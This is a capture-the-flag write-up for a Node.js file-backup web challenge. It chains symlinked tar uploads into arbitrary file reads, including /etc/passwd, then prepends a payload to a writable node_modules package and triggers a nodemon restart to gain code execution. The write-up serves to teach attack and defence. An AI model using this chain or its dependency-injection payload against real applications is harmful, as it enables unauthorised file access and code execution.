---
title: "Cloud Backup"
ctf: "Kashi CTF 2026"
date: "2026-04-03"
description: "A web app arbitrary file read vulnerability via symlinks"
points: 500
tags: ["Web"]
---

## tl;dr

This challenge is a web app that lets users sign up, upload files, browse their backup directory, and download stored files. The hint about "usual, idiomatic WORKDIR values" points you toward looking inside a Dockerized Node app, especially under paths like `/app`.

**Challenge points:** 500

The intended bug is in archive extraction. The app accepts `.tar.gz` uploads and extracts them with `decompress`, but it never blocks symlinks. Later, its download logic uses `fs.stat()` and `res.download()`, both of which follow symlinks. That gives an arbitrary file read primitive.

---

## Recon

The landing page showed a normal file manager with:

- signup / login
- folder creation
- file upload
- `.tar.gz` extraction support

After registering, the core API surface was easy to infer from the frontend and responses:

- `POST /api/signup`
- `POST /api/login`
- `GET /api/user`
- `GET /api/files?path=...`
- `POST /api/upload`
- `GET /api/download?path=...`
- `DELETE /api/files?path=...`

The first important test was uploading a `.tar.gz` containing a symlink instead of a regular file.

---

## Arbitrary File Read via Symlink Archive

I created an archive containing a symlink:

```bash
ln -s /etc/passwd pwn
tar -czf cbpwn.tar.gz pwn
```

Then uploaded it to `/api/upload`. After extraction, downloading `pwn` returned the contents of `/etc/passwd`.

That proves:

- archive extraction preserves symlinks
- the app does not sanitize extracted entries
- download follows the symlink target

**The vulnerability chain:**

1. Upload a tarball with a symlink to an arbitrary file
2. Extract into your own user directory
3. Download the symlink name
4. Read any readable server-side file

---

## Reading the App Source

Using that primitive, I read:

- `/app/package.json`
- `/app/server.js`
- `/app/Dockerfile`
- `/app/docker-entrypoint.sh`
- `/app/sayhi.c`

### Key findings

**From `server.js`:**
- `.tar.gz` uploads are extracted with `decompress(tempPath, targetPath)`
- Path safety only checks the user-controlled archive member path, not the resolved symlink target
- `fs.stat(fullPath)` is used before download, which follows symlinks

**From `Dockerfile`:**
- `WORKDIR /app`
- `/sayhi` is copied into the container
- `/sayhi` is made setuid root with mode `4755`
- App runs under `USER nodejs`

**From `docker-entrypoint.sh`:**

```sh
#!/bin/sh

sh /app/write-flag-to-rootdir.sh
rm -f /app/write-flag-to-rootdir.sh

sudo -u nodejs npm run dev
```

- A root-only startup script handles flag placement
- The app then runs under `nodejs`
- `nodemon` is used in dev mode, so file changes can restart the server

**From `sayhi.c`:**

```c
#include <stdio.h>

int main() {
    char buf[1024];
    FILE *f = fopen("/flag", "r");
    while (fgets(buf, sizeof(buf), f)) printf("%s", buf);
    fclose(f);
}
```

This is the key pivot: `/sayhi` reads `/flag`, and `/sayhi` is setuid root — so even if the app user cannot read `/flag` directly, executing `/sayhi` can.

---

## Why Direct Flag Read Fails

Symlink reads for `/flag` and `/flag.txt`:

- `/flag` existed, but returned `EACCES`
- `/flag.txt` did not exist

The flag is at `/flag`, but the unprivileged Node process cannot open it directly. We need code execution to call `/sayhi`.

---

## Getting Code Execution Without Touching `server.js`

Overwriting `/app/server.js` was tried first, but using a directory symlink to `/app` made the service unstable.

A cleaner path: overwrite a writable dependency file under `/app/node_modules`.

Because `/app` is owned by `nodejs`, files created by `npm install` under `/app/node_modules` are writable by the app user. I confirmed `cookie-parser` existed by reading:

- `/app/node_modules/cookie-parser/index.js`
- `/app/node_modules/cookie-parser/package.json`

Since `server.js` does `require('cookie-parser')` at startup, changing that file gives code execution on the next restart.

### Payload

I downloaded the original `cookie-parser/index.js`, prepended this payload, then appended the original module contents so the app would still load normally:

```js
'use strict'
const fs = require('fs')
const { execFileSync } = require('child_process')
try {
  fs.writeFileSync('/app/owned.txt', execFileSync('/sayhi').toString())
} catch (e) {}
```

On startup, when Node loads `cookie-parser`, it executes `/sayhi`, captures the flag output, and writes it to `/app/owned.txt`.

---

## Triggering the Restart

The app is started with:

```json
"dev": "nodemon -q server.js"
```

and `nodemonConfig` includes:

```json
"ext": "node"
```

So creating any new `.node` file under `/app` triggers a restart. Steps:

1. Upload a symlink archive pointing `restart.node` → `/app/restart.node` and `owned.txt` → `/app/owned.txt`
2. Upload a small regular file named `restartnode` through the symlink path — it writes to `/app/restart.node`
3. nodemon restarts the app
4. The modified `cookie-parser` runs
5. `/app/owned.txt` is created with the flag

> **Note:** After restart, the app regenerates `JWT_SECRET`, invalidating old tokens. Simply sign up again with a new user and use a fresh token.

---

## Final Read

Uploaded one more symlink:

```
owned -> /app/owned.txt
```

Downloaded `owned` and retrieved the flag:

```
kashiCTF{19a0f28ae45d635a23a430802f7d4865pKET3yRSRx}
```

---

## Flag

```
kashiCTF{19a0f28ae45d635a23a430802f7d4865pKET3yRSRx}
```

---

## Vulnerability Summary

| Step | Description |
|------|-------------|
| 1 | Tar extraction accepts symlinks |
| 2 | Download follows symlinks → arbitrary file read |
| 3 | File read leaks application source |
| 4 | Source reveals setuid helper `/sayhi` that prints `/flag` |
| 5 | Writable dependency under `/app/node_modules` allows startup code injection |
| 6 | nodemon restart triggered by writing a `.node` file into `/app` |
| 7 | Injected dependency executes `/sayhi` and dumps flag to a readable file |

---

## What to Learn

- Archive extraction bugs aren't just ZipSlip/path traversal. Preserved symlinks are often enough for file read or write pivots.
- Reading source code from the live target is often the fastest way to move from "weird bug" to a full exploit chain.
- If direct file read hits permission errors, look for helper binaries, startup scripts, or misconfigured privileges.
- In Node apps, writable `node_modules` plus restart capability is often enough for code execution.
- `nodemon` in production-like environments is dangerous because any file write to a watched extension can become an execution trigger.
